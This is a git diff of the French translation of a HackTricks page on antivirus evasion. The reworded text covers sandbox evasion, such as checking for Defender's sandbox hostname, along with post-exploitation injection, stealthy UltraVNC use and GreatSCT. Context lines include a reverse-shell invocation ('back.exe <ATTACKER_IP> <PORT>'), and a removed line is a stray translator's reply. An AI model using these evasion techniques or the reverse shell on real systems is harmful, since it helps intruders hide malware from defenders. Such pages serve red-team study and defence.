@@ -44,17 +44,17 @@ Je vous recommande vivement de consulter cette [playlist YouTube](https://www.yo
 
 L'analyse dynamique consiste à exécuter votre binaire dans un bac à sable et à surveiller les activités malveillantes (par exemple, essayer de décrypter et de lire les mots de passe de votre navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus difficile à travailler, mais voici quelques choses que vous pouvez faire pour éviter les bac à sable.
 
-* **Dormir avant l'exécution** Selon la façon dont il est implémenté, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont très peu de temps pour scanner les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc l'utilisation de longs délais peut perturber l'analyse des binaires. Le problème est que de nombreux bac à sable AV peuvent simplement sauter le délai en fonction de la façon dont il est implémenté.
+* **Dormir avant l'exécution** Selon la façon dont il est implémenté, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont très peu de temps pour scanner les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc l'utilisation de longues pauses peut perturber l'analyse des binaires. Le problème est que de nombreux bac à sable AV peuvent simplement sauter la pause en fonction de la façon dont elle est implémentée.
 * **Vérification des ressources de la machine** Les bac à sable ont généralement très peu de ressources à utiliser (par exemple, < 2 Go de RAM), sinon ils pourraient ralentir la machine de l'utilisateur. Vous pouvez également être très créatif ici, par exemple en vérifiant la température du CPU ou même les vitesses du ventilateur, tout ne sera pas implémenté dans le bac à sable.
-* **Vérifications spécifiques à la machine** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne correspond pas, vous pouvez faire sortir votre programme.
+* **Vérifications spécifiques à la machine** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne le fait pas, vous pouvez faire sortir votre programme.
 
-Il s'avère que le nom d'ordinateur Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom d'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, vous pouvez donc faire sortir votre programme.
+Il s'avère que le nom d'ordinateur Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, vous pouvez donc faire sortir votre programme.
 
 <figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
 Quelques autres bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour lutter contre les bac à sable
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (2).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
 
 Comme nous l'avons dit précédemment dans ce post, les **outils publics** seront éventuellement **détectés**, donc, vous devriez vous poser une question :
 
@@ -63,7 +63,7 @@ Par exemple, si vous voulez vider LSASS, **avez-vous vraiment besoin d'utiliser 
 La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un, sinon le malware le plus signalé par les AV et les EDR, alors que le projet lui-même est super cool, c'est aussi un cauchemar pour travailler avec lui pour contourner les AV, alors cherchez simplement des alternatives pour ce que vous essayez d'atteindre.
 
 {% hint style="info" %}
-Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS TÉLÉCHARGER SUR VIRUSTOTAL** si votre objectif est d
+Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS TÉLÉCHARGER SUR VIRUSTOTAL** si votre
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
     $binarytoCheck = "C:\Program Files\" + $_
@@ -274,13 +274,13 @@ La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc,
 
 * **Fork\&Run**
 
-Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implantation Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation se passe mal ou est détecté, il y a une **beaucoup plus grande chance** que notre **implantation survive.** L'inconvénient est que vous avez une **plus grande chance** d'être détecté par les **détections comportementales**.
+Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implant de Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation se passe mal ou est détecté, il y a une **beaucoup plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande chance** de vous faire prendre par des **détections comportementales**.
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus et de le faire scanner par AV, mais l'inconvénient est que si quelque chose ne va pas avec l'exécution de votre charge utile, il y a une **beaucoup plus grande chance** de **perdre votre balise** car elle pourrait planter.
+Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus et de le faire scanner par AV, mais l'inconvénient est que si quelque chose ne va pas avec l'exécution de votre charge utile, il y a une **beaucoup plus grande chance** de **perdre votre beacon** car il pourrait planter.
 
 <figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -331,7 +331,7 @@ netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Téléchargez-le à partir de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas l'installation)
+Téléchargez-le depuis: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas l'installation)
 
 **SUR L'HÔTE**: Exécutez _**winvnc.exe**_ et configurez le serveur:
 
@@ -347,13 +347,13 @@ L'**attaquant** doit **exécuter à l'intérieur** de son **hôte** le binaire `
 
 **ATTENTION:** Pour maintenir la discrétion, vous ne devez pas faire certaines choses
 
-* Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution ou vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/1SROTTl.png). Vérifiez s'il est en cours d'exécution avec `tasklist | findstr winvnc`
+* Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution ou vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/1SROTTl.png). Vérifiez s'il fonctionne avec `tasklist | findstr winvnc`
 * Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire ou cela provoquera l'ouverture de [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
 * Ne lancez pas `winvnc -h` pour obtenir de l'aide ou vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
-Téléchargez-le à partir de: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+Téléchargez-le depuis: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -375,11 +375,11 @@ FUD signifie "Fully Undetectable" (complètement indétectable). Il s'agit d'un 
 
 ## Polymorphisme
 
-Le polymorphisme est une technique qui consiste à modifier le code du payload à chaque exécution. Cela rend le payload difficile à détecter car il est différent à chaque fois qu'il est exécuté. Les outils tels que `Veil-Evasion` et `Unicorn` peuvent être utilisés pour créer des payloads polymorphes.
+Le polymorphisme est une technique qui consiste à modifier le code du payload à chaque exécution, de sorte qu'il ne corresponde pas à la signature de l'antivirus. Cette technique est très efficace pour contourner les antivirus, car elle rend le payload unique à chaque exécution.
 
 ## Conclusion
 
-Le contournement des antivirus est une étape importante dans la création de payloads. Les techniques d'encodage, de FUD et de polymorphisme peuvent être utilisées pour rendre les payloads indétectables par les antivirus. Il est important de tester les payloads avec des antivirus pour s'assurer qu'ils ne sont pas détectés.
+Le contournement des antivirus est un aspect important de la création de payloads. Les techniques d'encodage, de FUD et de polymorphisme sont toutes efficaces pour atteindre cet objectif. Il est important de tester le payload avec plusieurs antivirus pour s'assurer qu'il est indétectable.
 ```
 use 1
 list #Listing available payloads
@@ -405,7 +405,7 @@ Compilez-le avec:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-Je suis prêt. Veuillez me donner le texte à traduire.
+Utilisez-le avec:
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -553,7 +553,7 @@ https://github.com/praetorian-code/vulcan
 * Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
